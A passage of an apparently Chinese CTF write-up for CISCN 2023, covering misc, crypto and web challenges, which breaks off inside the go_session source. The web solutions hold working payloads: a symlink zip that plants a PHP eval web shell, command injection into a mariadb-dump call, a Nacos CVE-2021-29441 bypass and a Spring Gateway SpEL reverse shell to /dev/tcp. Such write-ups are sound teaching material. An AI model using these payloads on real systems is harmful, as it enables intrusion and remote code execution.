class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_list = os.listdir(<span class="hljs-string">&#x27;tmp4&#x27;</span>)<br>Res1_L,Res2_L,Ypel_L,XY_L = [],[],[],[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    Res1 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res2 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Ypel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">22</span>:<span class="hljs-number">26</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res1_L.append(Res1)<br>    Res2_L.append(Res2)<br>    Ypel_L.append(Ypel)<br>    XY_L.append((Res2,Res1))<br>a = <span class="hljs-built_in">sorted</span>(Res1_L)<br>b = <span class="hljs-built_in">sorted</span>(Res2_L)<br>c = <span class="hljs-built_in">sorted</span>(XY_L)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):<br>    ind = XY_L.index(c[i])<br>    <span class="hljs-keyword">if</span>(Ypel_L[ind] == <span class="hljs-number">4294967196</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;0&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;1&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-4.png"></p><p>第三部分在补齐字节的数据中<br>找到第一张图片<code>17447199634.bmp</code>，查看补齐字节的数据</p><p>发现依次是<code>FF D8</code>，<code>FF E1</code>等</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-5.png"></p><p>所以可以以<code>padding</code>数据按照左上到右下的顺序拼接得到<code>jpg</code>图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_list = os.listdir(<span class="hljs-string">&#x27;tmp4&#x27;</span>)<br>Xpel_L,XY_L,Leng_L,Ypel_L,f_list = [],[],[],[],[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    Res1 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res2 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Xpel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">18</span>:<span class="hljs-number">22</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Ypel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">22</span>:<span class="hljs-number">26</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>    Xpel_L.append(Xpel)<br>    XY_L.append((Res2,Res1))<br>    Leng_L.append((<span class="hljs-built_in">len</span>(f)-<span class="hljs-number">54</span>))<br>    Ypel_L.append(Ypel)<br>c = <span class="hljs-built_in">sorted</span>(XY_L)<br><br>Padding_file = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):<br>    ind = XY_L.index(c[i])<br>    <span class="hljs-keyword">if</span>(Leng_L[ind] != Xpel_L[ind]*<span class="hljs-number">300</span>):<br>        Padding_file.append(ind)<br><br>data = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(Padding_file)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[Padding_file[i]]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    w = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">18</span>:<span class="hljs-number">22</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>    f = f[<span class="hljs-number">54</span>:]<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(f)-w*<span class="hljs-number">100</span>*<span class="hljs-number">3</span> == <span class="hljs-number">100</span>):<br>        pad = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(<span class="hljs-built_in">len</span>(f)-w*<span class="hljs-number">100</span>*<span class="hljs-number">3</span> == <span class="hljs-number">200</span>):<br>        pad = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">else</span>:<br>        pad = <span class="hljs-number">3</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        d = f[j*(w*<span class="hljs-number">3</span>+pad):j*(w*<span class="hljs-number">3</span>+pad)+w*<span class="hljs-number">3</span>+pad]<br>        data += d[-pad:]<br>fw = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.jpg&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>).write(data)<br></code></pre></td></tr></table></figure><p>得到第三部分的flag：<code>3rd_parT_1s_paddINGINGING</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/flag.jpg"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="基于国密SM2算法的密钥密文分发"><a href="#基于国密SM2算法的密钥密文分发" class="headerlink" title="基于国密SM2算法的密钥密文分发"></a>基于国密SM2算法的密钥密文分发</h2><p>根据文档一步一步来即可，虽然有点没看懂</p><p>先找个网址生成一组公钥和密钥 <a href="https://www.lzltool.com/SM2">https://www.lzltool.com/SM2</a></p><p>登录拿id</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-%E5%9F%BA%E4%BA%8E%E5%9B%BD%E5%AF%86SM2%E7%AE%97%E6%B3%95%E7%9A%84%E5%AF%86%E9%92%A5%E5%AF%86%E6%96%87%E5%88%86%E5%8F%91-1.png"></p><p>上传公钥</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-%E5%9F%BA%E4%BA%8E%E5%9B%BD%E5%AF%86SM2%E7%AE%97%E6%B3%95%E7%9A%84%E5%AF%86%E9%92%A5%E5%AF%86%E6%96%87%E5%88%86%E5%8F%91-2.png"></p><p>访问<code>/api/quantum</code>获取密钥密文</p><p>访问<code>/api/check</code>发送<code>quantumString</code>的值</p><p>使<code>quantumStringUser</code>的值等于<code>quantumStringServer</code>的值即可通过验证</p><p>访问<code>/api/search</code>得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-%E5%9F%BA%E4%BA%8E%E5%9B%BD%E5%AF%86SM2%E7%AE%97%E6%B3%95%E7%9A%84%E5%AF%86%E9%92%A5%E5%AF%86%E6%96%87%E5%88%86%E5%8F%91-3.png"></p><h2 id="可信度量"><a href="#可信度量" class="headerlink" title="可信度量"></a>可信度量</h2><p>非预期</p><p><code>/proc/22/task/22/environ</code>可以直接看到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-%E5%8F%AF%E4%BF%A1%E5%BA%A6%E9%87%8F.png"></p><h2 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd"></a>Sign_in_passwd</h2><p>base64换表</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-Sign_in_passwd.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><p>上传后返回源码</p><p>只能上传<code>zip</code>文件，上传后在<code>tmp</code>目录使用<code>unzip -o</code>解压</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>&#125;;<br><br><span class="hljs-comment">//only this!</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">//构造一个指向/var/www/html的软连接<br><span class="hljs-built_in">ln</span> -s /var/www/html poc<br><br>//保留软连接压缩<br>zip --symlinks test.zip poc<br><br>//创建跟第一个压缩包中目录同名的目录<br><span class="hljs-built_in">mkdir</span> poc<br><br>//接着向目录中写一个shell<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;?php eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;</span> &gt; ./poc/shell.php<br><br>//压缩这个目录<br>zip -r test1.zip poc<br></code></pre></td></tr></table></figure><p>上传第一个压缩包后会在<code>tmp</code>目录下生成一个软连接到<code>/var/www/html</code>，当我们上传第二个压缩包时，因为<code>poc</code>目录已经软连接到<code>/var/www/html</code>了，所以解压的时候会把<code>shell.php</code>放在<code>/var/www/html</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj18.png"></p><h2 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h2><p>根据题目描述可知分别有查询和导出的功能点</p><p>根据执行命令后的返回值推测执行的命令如下</p><p>传入<code>?db=a&amp;table_2_query=b</code>时会执行<code>select * from a.b</code><br>传入<code>?db=a&amp;table_2_dump=b</code>时会执行<code>mysqldump -u root a b &gt; log/xxx.log</code></p><p>这里因为<code>a</code>和<code>b</code>的值可控，所以相当于我们可以执行命令了</p><p>方法1：<br>直接传<code>?db=ctf&amp;table_2_dump=%0a+id+&gt;+log/1+%0</code>，然后访问<code>log/1</code></p><p>方法2：<br>因为<code>mysqldump</code>在找不到我们给出的表的情况下会抛出错误信息<code>mysqldump: Couldn&#39;t find table: &quot;表名&quot;</code></p><p>在<code>linux</code>中可以利用<code>2&gt;</code>将命令执行的结果输出到文件中</p><p>传<code>/?db=ctf&amp;table_2_dump=\&lt;\?\=phpinfo\(\)?\&gt;+2&gt;+log/1.php</code>，然后访问<code>1.php</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-dumpit-2.png"></p><p>index.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;www-data&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black</span> = <span class="hljs-string">&#x27;;`*#^$&amp;|&#x27;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$black</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$black</span>[<span class="hljs-variable">$i</span>])===<span class="hljs-literal">FALSE</span>))&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&#x27;host&#x27;</span>)===<span class="hljs-literal">FALSE</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&#x27;-h&#x27;</span>)===<span class="hljs-literal">FALSE</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=<span class="hljs-subst">$servername</span>;dbname=ctf&quot;</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>&#125;<br><span class="hljs-keyword">catch</span>(PDOException <span class="hljs-variable">$e</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;use ?db=&amp;table_2_query= or ?db=&amp;table_2_dump= to view the tables! etc:?db=ctf&amp;table_2_query=flag1&#x27;</span>;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;db&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$db</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;db&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no db!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$t2q</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>];<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from <span class="hljs-subst">$db</span>.<span class="hljs-subst">$t2q</span>&quot;</span>;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$t2q</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$db</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-variable">$stm</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$stm</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$res</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(PDOException <span class="hljs-variable">$e</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$t2d</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$t2d</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$db</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$randstr</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>());<br>    <span class="hljs-variable">$dump</span>=<span class="hljs-string">&#x27;mariadb-dump &#x27;</span>.<span class="hljs-variable">$db</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$t2d</span>.<span class="hljs-string">&#x27; &gt;./log/&#x27;</span>.<span class="hljs-variable">$randstr</span>.<span class="hljs-string">&#x27;.log&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$dump</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;dump log here: &lt;a href=\&#x27;&#x27;</span>.<span class="hljs-string">&#x27;./log/&#x27;</span>.<span class="hljs-variable">$randstr</span>.<span class="hljs-string">&#x27;.log&#x27;</span>.<span class="hljs-string">&#x27;\&#x27;&gt;here&lt;/a&gt;&#x27;</span>;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h2><p>nacos服务，CVE-2021-29441添加任意用户进后台</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-BackendService-1.png"></p><p>分析<code>backend-1.0-SNAPSHOT.jar</code></p><p>发现内部配置服务有个8888的gateway服务，id为backcfg</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">cloud:</span><br>    <span class="hljs-attr">nacos:</span><br>      <span class="hljs-attr">discovery:</span><br>        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8888</span><br>      <span class="hljs-attr">config:</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">backcfg</span><br>        <span class="hljs-attr">file-extension:</span> <span class="hljs-string">json</span><br>        <span class="hljs-attr">group:</span> <span class="hljs-string">DEFAULT_GROUP</span><br>        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8888</span><br></code></pre></td></tr></table></figure><p>可以通过修改Gateway配置文件反代backendservice服务实现rce</p><p>参考文章：<a href="https://xz.aliyun.com/t/11493#toc">https://xz.aliyun.com/t/11493#toc</a></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-BackendService-2.png"></p><p>反弹shell</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;spring&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;cloud&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;gateway&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;routes&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;exam&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;order&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;uri&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;lb://backendservice&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;predicates:&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>                            <span class="hljs-string">&quot;Path=/evil/**&quot;</span><br>                        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;filters&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>                            <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;RewritePath&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                                    <span class="hljs-attr">&quot;replacement&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/xxxx/xxxx 0&gt;&amp;1&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span><br>                                <span class="hljs-punctuation">&#125;</span><br>                            <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">]</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-BackendService-3.png"></p><h2 id="go-session"><a href="#go-session" class="headerlink" title="go_session"></a>go_session</h2><p>源码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 